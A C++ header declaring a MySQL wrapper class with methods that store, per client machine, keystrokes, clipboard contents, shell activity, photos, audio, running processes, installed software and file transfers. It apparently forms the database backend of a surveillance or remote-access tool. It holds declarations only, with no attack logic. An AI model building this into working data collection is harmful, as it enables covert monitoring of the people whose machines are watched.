#pragma once

#include <vector>
#include <iostream>
#include "include/mysql.h"



using namespace std;

class MySql {
public:

	MySql();
	virtual ~MySql();

	void closeMySQL();
	bool connectMySQL(char* server, char* username, char* password, char* database, int port);
	bool createDatabase(std::string dbname);
	bool createdbTable(const std::string& query);
	void errorIntoMySQL();
	bool MySql::useDatabase(std::string dbname);
	bool getDatafromDB(string queryStr, std::vector<std::vector<std::string> >& data);

	bool MySql::init();

	static void MySql::initLock();
	static void enterLock();
	static void leaveLock();

	string MySql::getIDFromClient(string mac);
	string MySql::getIdFromUser(string username);
	//string MySql::getUIDFromClient(string iosid);
	int MySql::insertClient(string username, string mac, string info);
	int MySql::insertClientFromCmd(string username, string mac);

	int MySql::insertClipboard(string mac, string fullname);
	int MySql::insertShells(string mac, string fullname);
	int MySql::insertKeyboard(string mac, string fullname);
	int MySql::insertFilesOper(string mac, string fullname);
	int MySql::insertPhoto(string mac, string type, string filepath);
	int insertAudio(string userid, string filepath, int filesize);

	string MySql::getIdFromPhoto(string path);

	string MySql::getInstallAppsID(string clientid, string softname);
	int MySql::insertInstallApps(string mac, string name, string ver, string path, string pub, string unpath, string date);

	string MySql::getProcessID(string clientid, string processes, string pid);
	int MySql::insertProcesses(string mac, string processes, string pid);

	string MySql::getIdFromFiles(string clientid, string fullname);
	bool MySql::insertFiles(string mac, string fullname);

	int MySql::insertUploadFile(string mac, string data);
	int MySql::insertDownloadFile(string mac, string data);

public:
	int errorNum;                    //错误代号
	const char* errorInfo;             //错误提示

private:
	MYSQL mysqlInstance;                      //MySQL对象，必备的一个数据结构

};